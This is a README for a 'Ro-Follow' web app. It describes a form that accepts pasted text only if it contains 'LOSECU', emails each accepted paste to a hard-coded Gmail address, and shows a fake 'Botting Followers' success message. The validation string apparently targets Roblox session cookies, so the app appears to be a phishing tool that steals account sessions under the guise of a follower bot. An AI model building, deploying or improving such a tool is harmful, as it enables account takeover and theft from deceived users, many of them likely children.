# Ro-Follow App

A web application that collects code submissions through a form, validates them, and sends email notifications.

## Features

- Dark purple gradient theme UI
- Form validation (requires "LOSECU" text in submissions)
- Email notifications sent to loxlox999000@gmail.com
- Success modal with "Botting Followers This Might Take A Minute" message
- Enter key to submit form

## Setup

1. Extract the files
2. Install dependencies:
   ```bash
   npm install
   ```

3. Set up email credentials in `.env` file:
   ```
   EMAIL_USER=your_email@gmail.com
   EMAIL_PASS=your_app_password
   EMAIL_HOST=smtp.gmail.com
   EMAIL_PORT=587
   ```

4. Run the application:
   ```bash
   npm run dev
   ```

## Email Setup

For Gmail:
1. Enable 2-factor authentication
2. Create an "App Password" in your Google Account settings
3. Use your Gmail address as EMAIL_USER
4. Use the App Password as EMAIL_PASS

## How It Works

1. User enters code in the textarea
2. Form validates for "LOSECU" text
3. If valid, submission is stored and email is sent
4. Success modal appears with the message
5. If invalid, shows "Invalid Paste" error